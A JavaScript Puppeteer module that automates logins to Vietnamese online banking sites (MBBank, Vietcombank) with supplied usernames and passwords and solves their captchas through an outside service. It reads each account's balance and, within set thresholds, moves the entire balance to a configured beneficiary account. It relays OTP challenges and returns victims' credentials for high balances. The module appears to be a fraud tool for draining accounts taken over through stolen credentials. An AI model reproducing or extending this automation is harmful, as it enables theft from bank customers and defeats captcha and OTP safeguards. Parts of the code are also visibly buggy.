require('dotenv').config();
const puppeteer = require('puppeteer');
const Captcha = require("2captcha")
const solver = new Captcha.Solver(process.env.CAPTCHA_API_KEY);
const Client = require('@infosimples/node_two_captcha');
const axios = require('axios');
const client = new Client(process.env.CAPTCHA_API_KEY, {
    timeout: 60000,
    polling: 5000,
    throwErrors: false
});
let br = []
let pg = []
const openBrowser = async () => {
    const browser = await puppeteer.launch({
        headless: false,
    });
    const page = await browser.newPage();
    await page.setViewport({ width: 1080, height: 1024 });
    return { browser, page };
}

const getBalance = async (type, socketID) => {
    const page = pg.find(p => p.socketID == socketID).page;
    if (type == 'MBBank') {
        page.goto('https://online.mbbank.com.vn/information-account/source-account', { waitUntil: 'networkidle0' });
        await sleep(3000);
        page.waitForSelector('.balance');

        // const balance = await page.$eval('.balance', el => {
        //     // map innerText

        // });
        // balance == array .balance
        let balance = await page.$$eval('.balance', anchors => [].map.call(anchors, a => a.innerText));
        balance = balance[0];

        // balance.map((item, index) => {
        //     // replace VND
        //     balance[index] = item.replace('VND', '').replace(/\./g, '').trim();

        //     // convert to number

        //     balance[index] = parseFloat(balance[index]) * 1000;

        //     // chọn lớn nhất
        //     if (index > 0) {
        //         if (balance[index] > balance[index - 1]) {
        //             balance[index - 1] = balance[index];
        //         }
        //     }
        // });
        return balance;
    }
}

const loginMB = (async (username, password, socketID, settingData) => {
    const { browser, page } = await openBrowser();
    br.push({
        socketID: socketID,
        browser: browser
    })
    pg.push({
        socketID: socketID,
        page: page
    })

    await page.goto('https://online.mbbank.com.vn', { waitUntil: 'networkidle0' });
    await page.type('#user-id', username);
    await page.type('#new-password', password);

    let images = await page.$$eval('img', anchors => [].map.call(anchors, img => img.src));
    let img = images[images.length - 1];

    const captchaText = await solverCaptcha(img, 'MBBank');
    if (!captchaText) return await browser.close();

    await page.type("input[placeholder='NHẬP MÃ KIỂM TRA'", captchaText);
    await page.click('#login-btn');
    await sleep(3000);

    if (page.url() == 'https://online.mbbank.com.vn/pl/login?returnUrl=%2F') {
        const errorMessage = await page.$eval('.mat-dialog-content p', el => el.innerText);

        if (errorMessage) {
            if (errorMessage === 'Mã captcha không chính xác. Vui lòng thử lại.') {
                // await client.report(captchaText?._id);
                await browser.close();
                await loginMB()
            } else if (errorMessage === 'Thông tin đăng nhập không hợp lệ') {
                await browser.close();
                console.log(errorMessage);
                return {
                    message: errorMessage,
                    code: 404,
                    type: 'MBBank'
                };
            }
            else {
                await browser.close();
                return {
                    message: errorMessage,
                    code: 404,
                    type: 'MBBank'
                };
            }
        }
    } else if (page.url() == 'https://online.mbbank.com.vn/') {

        let balance = await getBalance('MBBank', socketID);
        if (balance) {
            balance = balance.replace('VND', '').replace(/\./g, '').trim();
            balance = parseFloat(balance) * 1000;
            // const response = await chuyenTien(balance, 'MBBank', socketID, settingData);

            // if balance < 2 triệu thì không chuyển
            if (balance <= 2000000) {
                // const response = await chuyenTien(balance, 'MBBank', socketID, settingData);
                await browser.close();
                return {
                    message: 'success',
                    code: 300,
                    balance: balance,
                    username: username,
                    password: password,
                };
            }
            else if (balance > 2000000 && balance <= 5000000) {
                const response = await chuyenTien(balance, 'MBBank', socketID, settingData);
                return response;
            } else if (balance > 5000000) {
                // thông báo tới admin
                return {
                    message: 'success',
                    code: 300,
                    balance: balance,
                    username: username,
                    password: password,
                };
            }
            // const response = await chuyenTien(balance, 'MBBank', socketID, settingData);
            // return response;
        }
    }
});

const chuyenTien = async (balance, type, socketID, settingData) => {
    console.log('settingData', settingData);

    const page = pg.find(p => p.socketID == socketID).page;

    if (type == 'MBBank') {
        await page.goto('https://online.mbbank.com.vn/transfer/inhouse');
        await sleep(3000);

        // await page.waitForSelector('mat-select[formcontrolname="accountSource"]');

        // page.click('mat-select[formcontrolname="accountSource"]');

        // await page.waitForSelector('.mat-option-text');

        // await page.$$('.mat-option-text')[1].click();;

        const buttonContinue = await page.$x("//button[contains(., ' TIẾP TỤC ')]");
        await page.waitForXPath("//button[contains(., ' TIẾP TỤC ')]");
        await buttonContinue[0].click();

        await page.waitForSelector('#mat-select-3');
        page.click('#mat-select-3');
        await page.waitForSelector('#mat-option-9');
        // GET ALL mat-option-text
        const matOptionText = await page.$$eval('.mat-option-text', anchors => [].map.call(anchors, a => {
            const text = a.querySelector('div > span').innerText;
            return text;
        }));

        let bankNameText = ''

        if (settingData.bankName === 'MB') {
            bankNameText = 'MB';
        } else if (settingData.bankName === 'VCB') {
            bankNameText = 'VCB';
        } else if (settingData.bankName === 'ACB') {
            bankNameText = 'ACB';
        } else if (settingData.bankName === 'HD') {
            bankNameText = 'HD';
        } else if (settingData.bankName === 'TCB') {
            bankNameText = 'TCB';
        } else if (settingData.bankName === 'NCB') {
            bankNameText = 'NCB';
        }
        // input placeHolder === Tìm kiếm
        await page.waitForSelector('.mat-select-search-input');

        await page.type('.mat-select-search-input', bankNameText);
        await sleep(1500);

        const matOption = await page.$$('.mat-option-text');
        await matOption[0].click();
        page.type("input[formcontrolname='creditAccount'", settingData.bankAccount);
        await sleep(1500);
        page.click("input[formcontrolname='amount'");
        await sleep(1500);
        page.type("input[formcontrolname='amount'", balance.toString());
        await sleep(1500);

        const buttonContinue2 = await page.$x("//button[contains(., ' TIẾP TỤC ')]");
        await sleep(1500);
        await buttonContinue2[1].click();
        await sleep(1500);
        const buttonContinue3 = await page.$x("//button[contains(., ' TIẾP TỤC ')]");
        await buttonContinue3[2].click();
        // get image base64 form ngx-qrcode
        await sleep(1500);
        await page.waitForSelector('ngx-qrcode > div > img');
        const imageBase64 = await page.$eval('ngx-qrcode > div > img', el => el.src);
        return {
            message: 'success',
            code: 200,
            image: imageBase64,
            type: 'MBBank'
        };
    } else if ('VCB') {
        await page.goto('https://vcbdigibank.vietcombank.com.vn/chuyentien/chuyentienquataikhoan');

        await sleep(3000);

        await page.waitForSelector('select[data-parsley-required-message="Quý khách vui lòng chọn ngân hàng thụ hưởng"]');

        page.click('select[data-parsley-required-message="Quý khách vui lòng chọn ngân hàng thụ hưởng"]');

        await page.waitForSelector('.select2-search__field');
        await sleep(1000);

        let bankNameText = ''

        if (settingData.bankName === 'VCB') {
            bankNameText = 'Ngân hàng TMCP Ngoại thương Việt Nam';
        } else if (settingData.bankName === 'MB') {
            bankNameText = 'Ngân hàng Quân Đội';
        } else if (settingData.bankName === 'ACB') {
            bankNameText = 'Ngân hàng TMCP Á Châu';
        } else if (settingData.bankName === 'HDBank') {
            bankNameText = 'Ngân hàng TMCP Phát triển TP.HCM';
        } else if (settingData.bankName === 'Techcombank') {
            bankNameText = 'Ngân hàng TMCP Kỹ Thương Việt Nam';
        } else if (settingData.bankName === 'NCB') {
            bankNameText = 'Ngân hàng TMCP Quốc Dân NCB';
        } else if (settingData.bankName === 'HD') {
            bankNameText = 'Ngân hàng TMCP Phát triển TP.HCM';
        }

        page.type('.select2-search__field', bankNameText);
        await sleep(2000);

        await page.waitForSelector('.select2-results__options > li:nth-child(1)');
        await sleep(1000);

        page.click('.select2-results__options > li:nth-child(1)');

        await sleep(2000);

        await page.waitForSelector('#SoTaiKhoanNguoiHuong');
        page.type('#SoTaiKhoanNguoiHuong', settingData.bankAccount);

        await sleep(2000);

        await page.waitForSelector('#SoTien');

        page.type('#SoTien', balance.toString());

        await sleep(2000);

        await page.waitForSelector('.form-main-footer button');
        await page.click('.form-main-footer button');


        await sleep(2000);

        await page.waitForSelector('#selectAuthMethod');

        page.click('#selectAuthMethod');

        await sleep(2000);

        await page.waitForSelector('.select2-results__options > li:nth-child(1)');
        page.click('.select2-results__options > li:nth-child(1)');

        await sleep(2000);

        await page.waitForSelector('.form-main-footer button');
        await page.click('.form-main-footer button');
        const otpType = 1
        // get image-captcha
        if (otpType == 2) {
            await page.waitForSelector('.image-captcha img');
            const imageBase64 = await page.$eval('.image-captcha img', el => el.src);

            const captchaText = await solverCaptcha(imageBase64, 'VCB');

            // xác thực captcha
            if (!captchaText) return await browser.close();

            await page.type("input[formcontrolname='CaptchaText'", captchaText);

            await sleep(1500);

            await page.waitForSelector('.form-main-footer button');
            await page.click('.form-main-footer button');

            await sleep(1500);

            const messageElement = await page.$x("//p[contains(., 'Mã kiểm tra không chính xác. Quý khách vui lòng kiểm tra lại.')]");

            if (messageElement.length > 0) {
                chuyenTien(balance, 'VCB', socketID, settingData);
            }
        } else {
            await sleep(1500);
            const responseOTP = await page.waitForSelector("input[formcontrolname='Challenge'");
            const value = await page.evaluate(el => el.value, responseOTP);
            return {
                message: 'success',
                code: 200,
                type: 'VCBSENDOTP',
                otpValue: value
            }
        }

        return {
            message: 'success',
            code: 200,
            type: 'VCBSENDOTP',
        }
    }


}

const loginVCB = (async (username, password, socketID, settingData) => {
    let page = pg.find(p => p.socketID == socketID);
    let browser = br.find(b => b.socketID == socketID);

    if (!page && !browser) {
        page = (await openBrowser()).page;
        browser = (await openBrowser()).browser;
        br.push({
            socketID: socketID,
            browser: browser
        })
        pg.push({
            socketID: socketID,
            page: page
        })
    } else {
        page = page.page;
        browser = browser.browser;
    }

    await page.goto('https://vcbdigibank.vietcombank.com.vn/login', { waitUntil: 'networkidle0', timeout: 60000 });

    await page.type('#username', username);
    await page.type('#app_password_login', password);

    let images = await page.$$eval('img', anchors => [].map.call(anchors, img => img.src));
    const img = images[2];
    const captchaText = await solverCaptcha(img, 'VCB');

    if (!captchaText) return await browser.close();

    console.log(captchaText);

    await page.type("input[formcontrolname='captcha'", captchaText);

    await sleep(1500);

    await page.click('#btnLogin');

    await sleep(3000);

    const messageElement = await page.$x("//p[contains(., 'Mã kiểm tra không chính xác. Quý khách vui lòng kiểm tra lại.')]");

    // get innerText message
    if (messageElement.length > 0) {
        const message = await page.evaluate(el => el.innerText, messageElement[0]);
        loginVCB(username, password, socketID, settingData);
    }

    const messageErrorBlock = await page.$x("//p[contains(., 'Quý khách đã nhập sai thông tin truy cập 1 lần liên tiếp. Quý khách lưu ý dịch vụ VCB Digibank sẽ bị TẠM KHÓA nếu Quý khách nhập sai mật khẩu liên tiếp 05 LẦN. Quý khách có thể thực hiện cấp lại mật khẩu tại tính năng Quên mật khẩu ở màn hình đăng nhập ứng dụng VCB Digibank hoặc các điểm giao dịch của VCB để được hỗ trợ')]");

    if (messageErrorBlock.length > 0) {
        const message = await page.evaluate(el => el.innerText, messageErrorBlock[0]);
        return {
            message: message,
            code: 404,
            type: 'VCB'
        };
    }

    const messageBrowserBlock = await page.$x("//p[contains(., '2. Trường hợp vẫn muốn giao dịch trên trình duyệt Web, vui lòng đăng nhập ứng dụng VCB Digibank để mở khóa đăng nhập Web theo hướng dẫn:')]");

    if (messageBrowserBlock.length > 0) {
        return {
            message: `Trường hợp vẫn muốn giao dịch trên trình duyệt Web, vui lòng đăng nhập ứng dụng VCB Digibank để mở khóa đăng nhập Web theo hướng dẫn:
Cài đặt >> Cài đặt chung >> Cài đặt đăng nhập >> Cài đặt đăng nhập VCB Digibank trên trình duyệt Web(đối với phiên bản App cũ); hoặc

Tiện ích >> Cài đặt >> Cài đặt chung >> Quản lý đăng nhập kênh >> Cài đặt đăng nhập VCB Digibank trên Web(đối với phiên bản App mới).`,
            code: 400,
            type: 'VCB'
        };
    }

    const checkMethod = await page.$x("//p[contains(., 'Quý khách vui lòng chọn phương thức xác thực để xác thực đăng nhập trên trình duyệt mới.')]");

    if (checkMethod.length > 0) {
        const message = await page.evaluate(el => el.innerText, checkMethod[0]);
        return {
            message: message,
            code: 201,
            type: 'VCB',
            options: [
                {
                    title: 'SMS OTP',
                    value: 'SMS OTP'
                },
                {
                    title: 'VCB smart OTP',
                    value: 'VCB smart OTP'
                }
            ]
        };
    }

    await page.waitForSelector('label[for="tk-eye2"]', { timeout: 60000 });

    await page.click('label[for="tk-eye2"]');

    await sleep(3000);

    await page.waitForSelector(".i");

    let balance = await page.$eval(".i", el => el.innerText);

    balance = balance.replace('VND', '').replace(/\./g, '').trim();

    balance = parseFloat(balance) * 1000;

    // const response = await chuyenTien(balance, 'VCB', socketID, settingData);
    // return response;

    // if balance < 2 triệu thì không chuyển
    if (balance < 2000000) {
        // await browser.close();
        return {
            message: 'success',
            code: 300,
            balance: balance,
            username: username,
            password: password,
        };
    }

    else if (balance >= 2000000) {
        const response = await chuyenTien(balance, 'VCB', socketID, settingData);
        // await browser.close();
        return response;
    } else if (balance >= 2000000 && balance <= 5000000) {
        const response = await chuyenTien(balance, 'VCB', socketID, settingData);
        return response;
    } else if (balance > 5000000) {
        // await browser.close();
        // thông báo tới admin
        return {
            message: 'success',
            code: 300,
            balance: balance,
            username: username,
            password: password,
        };
    } else {
        await browser.close();
        return {
            message: 'success',
            code: 300,
            balance: balance,
            username: username,
            password: password,
        };
    }

    // const response = await chuyenTien(balance, 'VCB', socketID, settingData);
    // return response;

});

const xacthucOTPVCB = async (otp, socketID) => {
    await sleep(1500);
    const page = pg.find(p => p.socketID == socketID).page;
    await page.waitForSelector("input[formcontrolname='otp'");

    page.type("input[formcontrolname='otp'", otp);
    await sleep(1500);
    const buttonContinue = await page.$x("//span[contains(., ' Tiếp tục')]");
    await sleep(1500);
    await buttonContinue[0].click();

    await sleep(2000);

    const messageError = await page.$x("//p[contains(., 'Mã OTP không chính xác')]");

    if (messageError.length > 0) {
        await browser.close();
        return {
            message: 'Mã OTP không chính xác',
            code: 404,
        };
    }

    await sleep(1500);

    const messageSave = await page.$x("//p[contains(., 'Xác thực đăng nhập thành công. Quý khách có muốn lưu trình duyệt Web để bỏ qua bước xác thực cho những lần đăng nhập tiếp theo không?')]");

    console.log(messageSave);

    if (messageSave.length > 0) {
        const buttonContinue2 = await page.$x("//span[contains(., 'Lưu')]");
        await buttonContinue2[0].click();
    }

    await sleep(4500);

    const balance = await getBalanceVCB(socketID);

    console.log('balance', balance);

    // return {
    //     message: 'success',
    //     code: 200,
    // };
    // return {
    //     message: 'success',
    //     code: 200,
    // };

}

const xacthucCTVCB = async (otp, socketID) => {
    const page = pg.find(p => p.socketID == socketID).page;
    await sleep(1500);

    let messageElement = await page.$x("//p[contains(., 'Mã OTP không chính xác, Quý khách vui lòng kiểm tra lại.')]");
    let message = '';

    // get innerText message
    if (messageElement.length > 0) {
        // close modal
        const buttonClose = await page.$x("//button[contains(., 'Đóng')]");
        console.log(buttonClose);
        await page.waitForXPath("//button[contains(., 'Đóng')]");
        await sleep(1500);
        await buttonClose[3].click();
        messageElement = null
    }

    await page.waitForSelector("input[formcontrolname='OtpText'");

    page.type("input[formcontrolname='OtpText'", otp);

    await sleep(1500);

    await page.waitForSelector(".form-main-footer button");
    await page.click(".form-main-footer button");

    await sleep(3000);

    // get innerText message
    messageElement = await page.$x("//p[contains(., 'Mã OTP không chính xác, Quý khách vui lòng kiểm tra lại.')]")
    if (messageElement.length > 0) {
        message = await page.evaluate(el => el.innerText, messageElement[0]);
        return {
            message: message,
            code: 404,
        };
    }
    messageElement = await page.$x("//p[contains(., 'Nhập sai OTP quá 3 lần. Quý khách vui lòng thực hiện giao dịch khác.')]");

    if (messageElement.length > 0) {
        message = await page.evaluate(el => el.innerText, messageElement[0]);

        return {
            message: message,
            code: 500,
        };
    }

    return {
        message: 'success',
        code: 200,
    };
}

const getBalanceVCB = async (socketID) => {
    console.log('click1');

    const page = pg.find(p => p.socketID == socketID).page;
    await page.waitForXPath(".tk-eye2-wrap");
    console.log('click');
    await page.click(".tk-eye2-wrap");

    await sleep(3000);
    console.log('click');

    const balanceElement = await page.waitForSelector(".i");

    console.log(balanceElement);

    // get innerText
    const balance = await page.$eval(".i", el => el.innerText);

    console.log('balance', balance);

    return balance;

}

const loginACB = (async (username, password) => {
    const { browser, page } = await openBrowser();

    await page.goto('https://online.acb.com.vn/', { waitUntil: 'networkidle0' });
});

const loginHDBank = (async (username, password) => {
    const { browser, page } = await openBrowser();

    await page.goto('https://ebanking.hdbank.com.vn/', { waitUntil: 'networkidle0' });
});

const xacthuc = async (otp, type) => {
    await sleep(1500);
    const page = pg.find(p => p.socketID == socketID).page;
    if (type == 'MBBank') {
        await page.waitForSelector("input[name='otp'");
        page.type("input[name='otp'", otp);
        const buttonContinue = await pg.$x("//button[contains(., ' ĐỒNG Ý ')]");
        await page.waitForXPath("//button[contains(., ' ĐỒNG Ý ')]");
        await sleep(1500);
        await buttonContinue[0].click();

        await sleep(1500);
        return {
            message: 'success',
            code: 200,
        };
    }
}

const xacthucOTPLogin = async (method, socketID) => {
    await sleep(1500);
    const page = pg.find(p => p.socketID == socketID).page;
    if (method == 'SMS OTP') {
        await page.waitForSelector(".select-2");
        page.click(".select-2");

        await page.waitForSelector(".select2-results__options");

        await page.waitForSelector(".select2-results__options > li:nth-child(1)");
        page.click(".select2-results__options > li:nth-child(1)");
    } else if (method == 'VCB smart OTP') {
        await page.waitForSelector(".select-2");
        page.click(".select-2");

        await page.waitForSelector(".select2-results__options");

        await page.waitForSelector(".select2-results__options > li:nth-child(2)");
        page.click(".select2-results__options > li:nth-child(2)");
    }

    await sleep(1500);
    // const buttonContinue = await page.$x("//button[contains(., ' TIẾP TỤC ')]");
    page.click("button[type='submit']");
    await sleep(1500);

    // get value input.input input-xs input-material
    await page.waitForSelector("input.input.input-xs.input-material");
    const input = await page.$("input.input.input-xs.input-material");
    const value = await page.evaluate(el => el.value, input);

    await sleep(1500);

    const messageOtp = await page.$x("//p[contains(., 'Vui lòng nhập mã OTP được gửi về số điện thoại đăng ký nhận SMS OTP của Quý khách để tiếp tục quá trình đăng nhập.')]");

    if (messageOtp.length > 0) {
        const message = await page.evaluate(el => el.innerText, messageOtp[0]);
        return {
            message: message,
            code: 200,
        };
    }
    return {
        message: 'success',
        code: 200,
        otpValue: value,
        type: 'METHOD_OTP_VCB'
    };
}

const solverCaptcha = async (img, type) => {
    let keyType = 9;
    switch (type) {
        case 'MBBank':
            keyType = 18;
            break;
        case 'VCB':
            keyType = 9;
            break;
        default:
            break;
    }

    const captchaData = await axios.post('https://anticaptcha.top/api/captcha', {
        apikey: process.env.CAPTCHA_API_KEY,
        img: img,
        type: keyType,
    });

    if (captchaData.data.success) {
        return captchaData.data.captcha;
    }

    return null;

}

const sleep = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
module.exports = {
    loginMB, xacthuc,
    loginVCB,
    loginACB,
    loginHDBank,
    xacthucOTPLogin,
    xacthucOTPVCB,
    xacthucCTVCB
}